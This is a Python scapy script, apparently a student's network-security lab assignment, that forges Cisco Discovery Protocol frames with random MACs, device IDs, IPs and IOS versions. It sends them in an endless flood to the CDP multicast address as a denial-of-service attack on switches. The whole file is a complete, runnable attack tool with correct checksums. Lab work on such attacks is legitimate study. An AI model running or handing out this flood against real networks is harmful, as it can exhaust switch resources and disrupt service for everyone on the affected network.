#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
import random
import string
import struct
import socket
from scapy.all import *
from scapy.layers.l2 import Ether, LLC, SNAP

def generar_string_aleatorio(longitud=6):
    caracteres = string.ascii_letters + string.digits
    return ''.join(random.choice(caracteres) for _ in range(longitud))

def generar_ip_aleatoria():
    return f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def construir_tlv(tipo, valor):
    valor_bytes = valor if isinstance(valor, bytes) else valor.encode('utf-8')
    longitud = 4 + len(valor_bytes)
    tlv = struct.pack('>HH', tipo, longitud) + valor_bytes
    return tlv

def construir_tlv_address_ipv4(ip):
    numero_direcciones = 0x01
    tipo_direccion = 0x0001
    longitud_direccion = len(socket.inet_aton(ip)) + 1
    nlpid_ipv4 = 0xcc
    direccion_bytes = socket.inet_aton(ip)
    addr_record = struct.pack('>B', numero_direcciones) + struct.pack('>H', tipo_direccion) + struct.pack('>B', longitud_direccion) + struct.pack('>B', nlpid_ipv4) + direccion_bytes
    return addr_record

def compute_cdp_checksum(data):
    """Calcula checksum correcto para CDP (RFC 1071 style)"""
    if len(data) % 2 == 1:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i+1]
        s += word
        s = (s & 0xffff) + (s >> 16)
    return ~s & 0xffff

def construir_paquete_cdp_falso(id_dispositivo, puerto_origen, ip_dispositivo, version_ios, plataforma):
    # Construir TLVs
    tlv_device_id = construir_tlv(0x0001, id_dispositivo)
    tlv_address = construir_tlv(0x0002, construir_tlv_address_ipv4(ip_dispositivo))
    tlv_port_id = construir_tlv(0x0003, puerto_origen)
    tlv_capabilities = construir_tlv(0x0004, struct.pack('>I', 0x00000021))
    tlv_software_version = construir_tlv(0x0005, version_ios)
    tlv_platform = construir_tlv(0x0006, plataforma)
    tlv_end = struct.pack('>HH', 0x0000, 0x0004)
    
    tlvs = tlv_device_id + tlv_address + tlv_port_id + tlv_capabilities + tlv_software_version + tlv_platform + tlv_end
    
    # Cabecera CDP con checksum temporal = 0
    version = 0x02
    ttl = 180
    cdp_header_zero = struct.pack('>BBH', version, ttl, 0x0000)
    
    # Calcular checksum correcto
    cdp_payload_para_checksum = cdp_header_zero + tlvs
    checksum = compute_cdp_checksum(cdp_payload_para_checksum)
    
    # Cabecera final con checksum correcto
    cdp_header_final = struct.pack('>BBH', version, ttl, checksum)
    cdp_payload_final = cdp_header_final + tlvs
    
    return cdp_payload_final

def cdp_dos_attack(interfaz):
    print(f"[*] Iniciando ataque CDP DoS en la interfaz: {interfaz}")
    print("[*] Dirección multicast destino: 01:00:0c:cc:cc:cc")
    print("[*] Presiona Ctrl+C para detener la inundación")
    print("[*] Checksum CDP corregido - compatible con Cisco IOL")
    print("-" * 50)
    
    contador = 0
    start_time = time.time()
    
    try:
        while True:
            mac_origen = RandMAC()
            id_dispositivo = f"ITLA-SW-{generar_string_aleatorio(4)}"
            puerto_origen = f"GigabitEthernet0/{random.randint(1,24)}"
            ip_dispositivo = generar_ip_aleatoria()
            version_ios = f"Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE{random.randint(1,9)}, RELEASE SOFTWARE (fc{random.randint(1,3)})"
            plataforma = f"cisco WS-C2960-{random.choice(['24','48','24PC','48PST'])}-L"
            
            cdp_payload = construir_paquete_cdp_falso(id_dispositivo, puerto_origen, ip_dispositivo, version_ios, plataforma)
            
            ether = Ether(src=mac_origen, dst="01:00:0c:cc:cc:cc")
            llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
            snap = SNAP(OUI=0x00000c, code=0x2000)
            
            sendp(ether / llc / snap / Raw(load=cdp_payload), iface=interfaz, verbose=False)
            
            contador += 1
            if contador % 50 == 0:
                print(f"[+] Enviados {contador} paquetes CDP | Checksum OK")
            
            time.sleep(random.uniform(0.005, 0.015))
            
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n[!] Ataque detenido")
        print(f"[+] Total paquetes enviados: {contador}")
        print(f"[-] Tasa: {contador / elapsed:.2f} pps")
    except PermissionError:
        print("\n[-] ERROR: Se necesitan sudo")
    except Exception as e:
        print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    interfaz_objetivo = "ens33"
    if len(sys.argv) > 1:
        interfaz_objetivo = sys.argv[1]
    
    print("=" * 50)
    print("LABORATORIO 1: CDP DoS ATTACK (Checksum Corregido)")
    print("Estudiante: Edwin De Paula (2024-2415)")
    print("ITLA - Seguridad en Redes")
    print("=" * 50)
    cdp_dos_attack(interfaz_objetivo)
